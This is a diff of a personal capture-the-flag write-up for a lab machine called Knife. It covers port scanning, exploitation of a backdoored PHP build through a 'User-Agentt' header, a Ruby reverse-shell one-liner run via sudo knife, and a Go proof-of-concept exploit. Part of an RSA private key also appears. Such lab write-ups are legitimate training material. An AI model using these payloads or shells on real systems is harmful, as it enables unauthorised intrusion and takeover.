@@ -1,11 +1,15 @@
 # Knife Writeup
 
 Name: Knife
-Date:  
+Date:  26/2/2026
 Difficulty:  Easy
 Goals:  
+- Easy machine to feel good in more hard times
 Learnt:
+- Go http library
+- versions, versions, versions
 Beyond Root:
+- Code an exploit PoC
 
 - [[Knife-Notes.md]]
 - [[Knife-CMD-by-CMDs.md]]
@@ -16,24 +20,30 @@ Beyond Root:
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](ping.png)
 
+Then I became enumeration all TCP ports with `nmap` to speed up following scans
 ![](nmap-tcp.png)
 
+Then `-sC` and `-sV` for default scripts
 ![](nmp-sc-sv.png)
 
+Went to the web site on port 80.
 ![](www-root.png)
 
-There is javascript `<script>`
+There is javascript `<script>`, but their is very little in term of functionality.
 ![](penjs.png)
 
+Which should have been a rabbithole end-state indicator of solution.
 ![](gospiderisanospider.png)
-I puzzled for a bit then went guided and the second question was php version, which I forgot to check. PHP major releases often have zero or n-day
+As I puzzled for a bit with some fuzzing and directory busting tools then went guided mode. The second question was php version, which I forgot to check. PHP major releases often have zero or n-day.
 ![](forgot.png)
 ## Exploit
 
+This was a infamous vulnerability of that year, there is a whole room dedicated to it on THM
 ![](php810.png)
 
 ## Foothold
 
+So simply enough a shell is gained,  via using the `User-Agentt` HTTP Header with a command that is just a simple bash reverse shell.
 ![](james.png)
 James rsa key
 ```
@@ -89,17 +99,18 @@ m0AbydTdhFrHAAAAD2phbWVzQGxvY2FsaG9zdAECAw==
 ```
 ## Privilege Escalation
 
+Before even uploading LinPeas I went through the initial PrivEsc checks manually and actually started with `sudo -l`: 
 ![](nopasswdsudoknife.png)
 
+Knife is a ruby application that with `sudo nopasswd`
 ![](gtfobinsknife.png)
-
-Basically it can execute ruby 
-
+basically it can execute anything at a root level. The initial thinking about a shell went to this, although looking though in code it seemed like the wrong choice.
 ```ruby
 knife exec -E 'ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''
 ```
-I thought against the reverse shell as I could not find any documentation on rsockets
+I thought against the reverse shell as I could not find any documentation on `-rsockets` - dorking problems circa late 2024 still an issue.
 
+So I looked up exec() and system() functions to use to just exec another bash shell:
 ![](root.png)
 ROOT!
 ![](root2.png)
@@ -122,6 +133,7 @@ import (
 	"context"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -131,6 +143,60 @@ import (
 	"time"
 )
 
+// Thanks to https://www.digitalocean.com/community/tutorials/how-to-make-http-requests-in-go
+// https://dev.to/jones_charles_ad50858dbc0/mastering-http-clients-in-go-your-guide-to-the-nethttp-package-2d8b
+func main() {
+	gracefulShutdown := make(chan os.Signal, 1)
+	signal.Notify(gracefulShutdown, syscall.SIGINT, syscall.SIGTERM)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	var targetURL string
+	var cmd string
+
+	flag.StringVar(&targetURL, "u", "", "target URL like 'http://69.69.69.69:9000'")
+	flag.StringVar(&cmd, "c", "", "Enter a OS command here like 'whoami'")
+	flag.Parse()
+
+	if len(os.Args) != 5 {
+		fmt.Printf("Number of flags(2) and args(2) provide does not equal 4: %v", os.Args)
+		os.Exit(1)
+	}
+
+	payloadBuilder := strings.Builder{}
+	payloadBuilder.WriteString("zerodiumsystem('" + "whoami" + "');)")
+
+	requestURL := fmt.Sprintf("%s", targetURL)
+	req, err := http.NewRequestWithContext(ctx, "POST", requestURL, nil)
+	if err != nil {
+		fmt.Printf("Request creation failed: %v", err)
+		os.Exit(1)
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")
+	req.Header.Set("User-Agentt", payloadBuilder.String())
+
+	res, err := http.DefaultClient.Do(req)
+	if err != nil {
+		fmt.Printf("client: error making http request: %s\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Printf("client: got response!\n")
+	fmt.Printf("client: status code: %d\n", res.StatusCode)
+
+	resBody, err := io.ReadAll(res.Body)
+	if err != nil {
+		fmt.Printf("client: could not read response body: %s\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Printf("client: response body: %s\n", string(resBody))
+
+	<-gracefulShutdown
+	_, cancel = context.WithTimeout(context.Background(), 3*time.Second)
+	defer handleTermination(cancel)
+}
+
 func handleTermination(cancel context.CancelFunc) {
 	fmt.Printf("Terminating application...\n")
 	log.Printf("Terminating application\n")
@@ -138,33 +204,5 @@ func handleTermination(cancel context.CancelFunc) {
 	os.Exit(0)
 }
 
-func main() {
-	gracefulShutdown := make(chan os.Signal, 1)
-	signal.Notify(gracefulShutdown, syscall.SIGINT, syscall.SIGTERM)
-
-	var targetURL string
-	var cmd string
-
-	flag.StringVar(&targetURL, "u", "", "target URL like 'http://69.69.69.69:9000'")
-	flag.StringVar(&cmd, "c", "", "Enter a OS command here like 'whoami'")
-
-	binName := os.Args[0]
-	args := os.Args[1:]
-
-	payloadBuilder := strings.Builder{}
-	payloadBuilder.WriteString("zerodiumsystem('" + cmd + "');)")
-
-	req, err := http.NewRequest("POST", targetURL)
-	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")
-	req.Header.Set("User-Agentt", payloadBuilder.String())
-
-	if err != nil {
-
-	}
-
-	<-gracefulShutdown
-	_, cancel := context.WithTimeout(context.Background(), 3*time.Second)
-	defer handleTermination(cancel)
-}
 
 ```
